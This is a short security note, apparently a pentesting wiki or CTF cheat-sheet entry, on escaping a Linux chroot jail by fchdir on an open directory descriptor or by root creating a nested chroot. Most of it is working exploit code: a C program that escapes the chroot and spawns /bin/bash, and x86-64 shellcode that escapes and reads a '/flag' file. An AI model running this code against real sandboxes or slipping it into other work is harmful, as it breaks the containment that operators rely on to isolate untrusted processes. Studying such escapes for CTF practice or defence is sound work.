# Escaping with fchdir

If there is an open fd for a dir that was opened before the chroot then u can use fchdir to change your dir to that one in the fd

Note: If u have an opened dir fd and can't use fchdir u can use openat if it's available

# Escaping with chroot

If you are root inside a chroot you can escape creating another chroot. This because 2 chroots cannot coexists (in Linux), so if you create a folder and then create a new chroot on that new folder being you outside of it, you will now be outside of the new chroot and therefore you will be in the FS.

This occurs because usually chroot DOESN'T move your working directory to the indicated one, so you can create a chroot but e outside of it.

```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void) {
    mkdir("chroot-dir", 0755);
    chroot("chroot-dir");
    for(int i = 0; i < 1000; i++) {
        chdir("..");
    }
    chroot(".");
    system("/bin/bash");
}
```

```asm
    mov rax, 0x72696474
    mov rdi, 0x1337500
    mov [rdi], rax

    mov rax, 83
    mov rsi, 0x1c0
    syscall

    mov rax, 161        
    syscall

    mov r9, 0x0
change:
    add r9, 0x1
    mov rax, 80
    mov rdi, 0x1337550
    mov r8, 0x2e2e
    mov [rdi], r8
    xor r8, r8
    syscall
    cmp r9, 0x5
    jne change

    mov rdi, 0x1337551
    mov rax, 161
    syscall

    mov rax, 0x67616c662f
    mov rdi, 0x1337600
    mov [rdi], rax

    mov rax, 0x2
    xor rsi, rsi
    xor rdx, rdx
    syscall

    mov rdi, rax
    mov rsi, 0x1337900
    mov rdx, 0x100
    xor rax, rax
    syscall

    mov rax, 0x1
    mov rdi, 0x1
    syscall

```